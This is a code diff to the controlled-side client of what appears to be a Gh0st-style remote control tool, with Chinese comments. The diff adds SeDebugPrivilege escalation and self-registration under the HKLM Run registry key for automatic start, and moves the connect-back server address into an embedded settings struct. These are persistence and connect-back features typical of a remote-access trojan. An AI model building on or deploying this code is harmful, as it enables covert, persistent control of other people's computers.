@@ -9,11 +9,13 @@
 #include "KernelManager.h"
 using namespace std;
 
-// 远程地址
-char  g_szServerIP[MAX_PATH] = {0};  
-unsigned short g_uPort = 0; 
+// 自动启动注册表中的值
+#define REG_NAME "a_ghost"
 
-// 应用程序状态（1-被控端退出 2-主控端退出）
+// 远程地址
+CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "", 0};
+
+// 应用程序状态（1-被控端退出 2-主控端退出 3-其他条件）
 BOOL g_bExit = 0;
 // 工作线程状态
 BOOL g_bThreadExit = 0;
@@ -24,6 +26,60 @@ DWORD WINAPI StartClient(LPVOID lParam);
 #if _CONSOLE
 
 enum { E_RUN, E_STOP } status;
+
+//提升权限
+void DebugPrivilege()
+{
+	HANDLE hToken = NULL;
+	//打开当前进程的访问令牌
+	int hRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
+
+	if (hRet)
+	{
+		TOKEN_PRIVILEGES tp;
+		tp.PrivilegeCount = 1;
+		//取得描述权限的LUID
+		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+		//调整访问令牌的权限
+		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+
+		CloseHandle(hToken);
+	}
+}
+
+/**
+* @brief 设置本身开机自启动
+* @param[in] *sPath 注册表的路径
+* @param[in] *sNmae 注册表项名称
+* @return 返回注册结果
+* @details Win7 64位机器上测试结果表明，注册项在：\n
+* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+* @note 首次运行需要以管理员权限运行，才能向注册表写入开机启动项
+*/
+BOOL SetSelfStart(const char* sPath, const char* sNmae)
+{
+	DebugPrivilege();
+
+	// 写入的注册表路径
+#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+
+	// 在注册表中写入启动信息
+	HKEY hKey = NULL;
+	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
+
+	// 判断是否成功
+	if (lRet != ERROR_SUCCESS)
+		return FALSE;
+
+	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);
+
+	// 关闭注册表
+	RegCloseKey(hKey);
+
+	// 判断是否成功
+	return lRet == ERROR_SUCCESS;
+}
 
 // 隐藏控制台
 // 参看：https://blog.csdn.net/lijia11080117/article/details/44916647
@@ -44,12 +100,13 @@ BOOL CALLBACK callback(DWORD CtrlType)
 
 int main(int argc, const char *argv[])
 {
-	status = E_RUN;
-	if (argc < 3)
+	if (!SetSelfStart(argv[0], REG_NAME))
 	{
-		std::cout<<"参数不足.\n";
-		return -1;
+		std::cout << "设置开机自启动失败，请用管理员权限运行.\n";
 	}
+
+	status = E_RUN;
+
 	HANDLE hMutex = ::CreateMutexA(NULL, TRUE, "ghost.exe");
 	if (ERROR_ALREADY_EXISTS == GetLastError())
 	{
@@ -58,12 +115,16 @@ int main(int argc, const char *argv[])
 	}
 	
 	SetConsoleCtrlHandler(&callback, TRUE);
-	const char *szServerIP = argv[1];
-	int uPort = atoi(argv[2]);
-	printf("[server] %s:%d\n", szServerIP, uPort);
-
-	memcpy(g_szServerIP,szServerIP,strlen(szServerIP));
-	g_uPort = uPort;
+	if (argc>=3)
+	{
+		g_SETTINGS.SetServer(argv[1], atoi(argv[2]));
+	}
+	if (strlen(g_SETTINGS.ServerIP())==0|| g_SETTINGS.ServerPort()<=0)	{
+		printf("参数不足: 请提供远程主机IP和端口!\n");
+		Sleep(3000);
+		return -1;
+	}
+	printf("[server] %s:%d\n", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
 
 	do{
 		g_bExit = 0;
@@ -103,9 +164,8 @@ BOOL APIENTRY DllMain( HINSTANCE hInstance,
 // 启动运行一个ghost
 extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 {
-	g_bExit = false;
-	memcpy(g_szServerIP,szServerIP,strlen(szServerIP));
-	g_uPort = uPort;
+	g_bExit = FALSE;
+	g_SETTINGS.SetServer(szServerIP, uPort);
 
 	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);
 	if (hThread == NULL) {
@@ -126,7 +186,7 @@ extern "C" __declspec(dllexport) void StopRun() { g_bExit = true; }
 extern "C" __declspec(dllexport) bool IsStoped() { return g_bThreadExit; }
 
 // 是否退出客户端
-extern "C" __declspec(dllexport) bool IsExit() { return 1 == g_bExit; }
+extern "C" __declspec(dllexport) BOOL IsExit() { return g_bExit; }
 
 #endif
 
@@ -138,7 +198,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 	while (!g_bExit)
 	{
 		DWORD dwTickCount = GetTickCount64();
-		if (!ClientObject->ConnectServer(g_szServerIP, g_uPort))
+		if (!ClientObject->ConnectServer(g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort()))
 		{
 			for (int k = 500; !g_bExit && --k; Sleep(10));
 			continue;
